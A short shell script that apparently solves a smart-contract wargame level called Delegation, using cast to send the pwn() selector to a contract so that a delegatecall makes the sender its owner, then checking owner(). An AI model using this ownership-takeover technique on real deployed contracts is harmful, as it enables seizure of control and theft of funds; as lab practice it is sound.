#!/bin/sh

# Getting the methodID for function using cast
cast calldata "pwn()"

# Using the output of command above to call contract
cast send $DELEGATION --rpc-url $RINKERBY --private-key $PRIVATE_KEY 0xdd365b8b --gas 50000

# Confirming that the owner has changed to us
cast call $DELEGATION --rpc-url $RINKERBY --private-key $PRIVATE_KEY "owner()"
